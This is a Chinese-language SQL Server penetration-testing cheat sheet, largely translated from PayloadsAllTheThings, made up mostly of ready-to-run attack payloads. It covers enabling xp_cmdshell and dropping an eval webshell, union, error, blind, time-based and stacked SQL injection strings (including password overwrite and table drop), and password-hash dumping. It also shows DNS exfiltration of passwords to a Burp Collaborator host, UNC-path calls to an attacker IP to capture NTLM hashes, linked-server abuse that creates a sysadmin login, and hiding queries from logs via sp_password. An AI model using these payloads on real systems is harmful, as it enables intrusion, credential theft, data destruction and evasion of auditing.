# sql server

相关工具：

- [MDUT](https://github.com/SafeGroceryStore/MDUT)
- [SharpSQLTools](https://github.com/uknowsec/SharpSQLTools)
- [MAT](https://github.com/SySS-Research/MAT)

## xp_cmdshell

> SQL Server 2005 之前版本，xp_cmdshell 默认开启:

```
exec master..xp_cmdshell 'whoami';
```

> 判断是否存在 xp_cmdshell 存储过程，返回1表示存在，否则表示不存在:

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';
```

> 删除 xp_cmdshell:

```
exec master..sp_dropextendedproc xp_cmdshell;
```

> 恢复 xp_cmdshell:

```
exec master..xp_dropextendedproc xp_cmdshell,@dllname='xplog70.dll' declare @o int;
```

> SQL Server 2005之后的版本中，xp_cmdshell 默认关闭，需要手动开启，开启xp_cmdshell需要sa权限:

```
# 允许修改高级参数
exec sp_configure 'show advanced options',1;
# 配置生效
RECONFIGURE;
# 开启xp_cmdshell
exec sp_configure 'xp_cmdshell',1;
# 配置生效
RECONFIGURE;
# 检查是否开启
exec sp_configure;
# 执行系统命令
exec master..xp_cmdshell 'whoami';
# 获取webshell
exec master..xp_cmdshell 'echo  ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\test.aspx'
```


## MSSQL 默认数据库

| Name                  | 描述                           |
|-----------------------|---------------------------------------|
| pubs	                | 在 MSSQL 2005 中不可用           |
| model	                | 在所有版本中可用             |
| msdb	                | 在所有版本中可用             |
| tempdb	            | 在所有版本中可用             |
| northwind	            | 在所有版本中可用             |
| information_schema	| 从 MSSQL 2000 及更高版本开始可用 |


## MSSQL 注释

| Type                       | 描述                       |
|----------------------------|-----------------------------------|
| `/* MSSQL Comment */`      | C-style 注释                   |
| `-- -`                     | SQL 注释                       |
| `;%00`                     | Null byte                         |


## MSSQL 用户

```sql
SELECT CURRENT_USER
SELECT user_name();
SELECT system_user;
SELECT user;
```

## MSSQL 版本查看

```sql
SELECT @@version
```

## MSSQL 主机名

```sql
SELECT HOST_NAME()
SELECT @@hostname
SELECT @@SERVERNAME
SELECT SERVERPROPERTY('productversion')
SELECT SERVERPROPERTY('productlevel')
SELECT SERVERPROPERTY('edition');
```

## MSSQL 数据库名

```sql
SELECT DB_NAME()
```


## MSSQL 数据库凭证

* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
    ```
* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```


## MSSQL 列出数据库

```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
```

## MSSQL 列出列

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, column_name FROM information_schema.columns
```

## MSSQL 列出表

```sql
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
```


## MSSQL 联合注入

```sql
-- extract databases names
$ SELECT name FROM master..sysdatabases
[*] Injection
[*] msdb
[*] tempdb

-- extract tables from Injection database
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users

-- extract columns for the table Users
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName

-- Finally extract the data
$ SELECT  UserId, UserName from Users
```


## MSSQL 报错注入

```sql
For integer inputs : convert(int,@@version)
For integer inputs : cast((SELECT @@version) as int)

For string inputs   : ' + convert(int,@@version) + '
For string inputs   : ' + cast((SELECT @@version) as int) + '
```


## MSSQL 盲注

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -

AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'

AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```


## MSSQL 时间注入

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```


## MSSQL 堆栈查询

* Without any statement terminator
    ```sql
    -- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

* Use a semi-colon ";" to add another query
    ```sql
    ProductID=1; DROP members--
    ```


## MSSQL 读取文件

**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```


## MSSQL 命令执行

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

重新激活 xp_cmdshell（在 SQL Server 2005 中默认禁用）

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

与 MSSQL 实例交互。

```powershell
sqsh -S 192.168.1.X -U sa -P superPassword
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

执行 Python 脚本

> 由与使用 xp_cmdshell 执行命令的用户不同的用户执行

```powershell
#Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```

## MSSQL 外带数据

### MSSQL DNS 外带数据

Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1

```powershell
# Permissions: Requires VIEW SERVER STATE permission on the server.
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))

# Permissions: Requires the CONTROL SERVER permission.
1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
```


### MSSQL UNC 路径

MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
```


## MSSQL 提升权限为 DB 管理员

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## MSSQL 受信任链接

> The links between databases work even across forest trusts.

```powershell
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio
```

Manual exploitation

```sql
-- find link
select * from master..sysservers

-- execute query through the link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- chain multiple openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- execute shell commands
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## 列出权限

列出当前用户在服务器上的有效权限。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
```

列出当前用户在数据库上的有效权限。

```sql
SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
```

列出当前用户在视图上的有效权限。

```
SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
```

检查当前用户是否属于指定的服务器角色。

```sql
-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
SELECT is_srvrolemember('sysadmin');
```

## MSSQL OPSEC

在查询中使用 `SP_PASSWORD` 以隐藏日志，如：`' AND 1=1--sp_password`


```sql
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```


## References

> 注：大部分内容翻译至：[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

* [MSSQL渗透测试](https://www.cnblogs.com/jerrylocker/p/10938899.html)
* [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [Error Based - SQL Injection ](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
* [MSSQL Trusted Links - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
* [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
* [SQL Server UNC Path Injection Cheatsheet - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009](https://www.exploit-db.com/papers/12975)
* [Microsoft - sys.fn_my_permissions (Transact-SQL)](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
* [Microsoft - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)